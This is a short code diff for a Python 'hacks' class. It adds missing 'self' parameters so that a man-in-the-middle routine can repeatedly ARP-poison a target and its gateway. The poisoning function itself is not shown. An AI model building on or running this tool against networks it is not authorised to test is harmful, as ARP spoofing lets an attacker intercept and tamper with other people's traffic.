@@ -7,7 +7,7 @@ import optparse
 class hacks:
     
 
-    def switcher(options):
+    def switcher(self,options):
         match options.approach_method:
             case "mitm":
                 if not options.target_ip:
@@ -16,7 +16,7 @@ class hacks:
                 if not options.gateway_ip:
                     print("Enter gateway ip")
                     exit(0)
-                mitm(options.target_ip, options.gateway_ip)
+                self.mitm(options.target_ip, options.gateway_ip)
 
             case default:
                 if not options.approach_method:
@@ -25,12 +25,12 @@ class hacks:
                     print("Not yet supported")
                     exit(0)
 
-    def mitm(target_ip, gateway_ip):
+    def mitm(self,target_ip, gateway_ip):
         try:
             number = 0
             while True:
-                arp_poison(target_ip, gateway_ip)
-                arp_poison(gateway_ip, target_ip)
+                self.arp_poison(target_ip, gateway_ip)
+                self.arp_poison(gateway_ip, target_ip)
 
                 number += 2
 
